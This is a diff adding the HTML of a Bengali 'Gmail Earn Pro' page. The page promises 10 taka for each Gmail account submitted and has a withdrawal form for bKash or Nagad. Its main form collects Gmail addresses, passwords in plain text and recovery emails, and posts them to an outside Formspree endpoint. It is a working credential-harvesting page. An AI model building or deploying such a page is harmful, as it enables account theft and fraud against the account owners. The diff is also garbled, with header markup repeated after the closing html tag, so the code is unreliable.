@@ -34,7 +34,92 @@
 
     <header>
         <h1>Gmail Earn Pro</h1>
-        <p>জিমেইল জমা দিন এবং সাথে সাথে টাকা আয় করুন</p>
+        <p>জিমেইল জমা দিন এবং সাথে সাথে টাকা আয় করুন</p>
+    </header>
+
+    <div class="container">
+        <!-- Dashboard Statistics -->
+        <div class="stats-grid">
+            <div class="card">
+                <h3>মোট জমা দেওয়া জিমেইল</h3>
+                <p id="totalSubmitted">0 টি</p>
+            </div>
+            <div class="card">
+                <h3>প্রতি জিমেইল রেট</h3>
+                <p>৳ ১০.০০</p>
+            </div>
+            <div class="card">
+                <h3>বর্তমান ব্যালেন্স</h3>
+                <p id="totalBalance">৳ 0.00</p>
+            </div>
+        </div>
+
+        <!-- Submit Gmail Form -->
+        <div class="form-section">
+            <h2>নতুন জিমেইল জমা দিন</h2>
+            <form action="https://formspree.io/f/moeaqbwb" method="POST" id="gmailForm">
+                <input type="hidden" name="_subject" value="নতুন জিমেইল বিক্রি জমা এসেছে!">
+                <div class="form-group">
+                    <label for="gmail">জিমেইল এড্রেস</label>
+                    <input type="email" name="Gmail_Address" id="gmail" placeholder="example@gmail.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">পাসওয়ার্ড</label>
+                    <input type="text" name="Password" id="password" placeholder="জিমেইলের পাসওয়ার্ড" required>
+                </div>
+                <div class="form-group">
+                    <label for="recovery">রিকভারি ইমেইল (যদি থাকে)</label>
+                    <input type="email" name="Recovery_Email" id="recovery" placeholder="recovery@example.com">
+                </div>
+                <button type="submit" class="btn">জিমেইল জমা দিন</button>
+            </form>
+        </div>
+
+        <!-- Withdraw Section -->
+        <div class="form-section">
+            <h2>টাকা তুলুন (Withdraw)</h2>
+            <form action="https://formspree.io/f/moeaqbwb" method="POST" id="withdrawForm">
+                <input type="hidden" name="_subject" value="নতুন উইথড্র রিকোয়েস্ট এসেছে!">
+                <div class="form-group">
+                    <label for="method">পেমেন্ট মেথড</label>
+                    <select name="Payment_Method" id="method" required>
+                        <option value="bkash">বিকাশ (bKash)</option>
+                        <option value="nagad">নগদ (Nagad)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="accountNumber">পার্সোনাল মোবাইল নম্বর</label>
+                    <input type="text" name="Phone_Number" id="accountNumber" placeholder="017XXXXXXXX" required>
+                </div>
+                <div class="form-group">
+                    <label for="amount">টাকার পরিমাণ (সর্বনিম্ন ৳ ৫০)</label>
+                    <input type="number" name="Amount" id="amount" min="50" placeholder="50" required>
+                </div>
+                <button type="submit" class="btn btn-withdraw">উইথড্র রিকোয়েস্ট পাঠান</button>
+            </form>
+        </div>
+
+        <!-- Submitted History -->
+        <div class="form-section">
+            <h2>আপনার জিমেইল জমার হিস্ট্রি</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>তারিখ</th>
+                        <th>জিমেইল</th>
+                        <th>পাসওয়ার্ড</th>
+                        <th>স্ট্যাটাস</th>
+                    </tr>
+                </thead>
+                <tbody id="historyTable">
+                    <!-- Dynamic Data -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+</body>
+</html>        <p>জিমেইল জমা দিন এবং সাথে সাথে টাকা আয় করুন</p>
     </header>
 
     <div class="container">
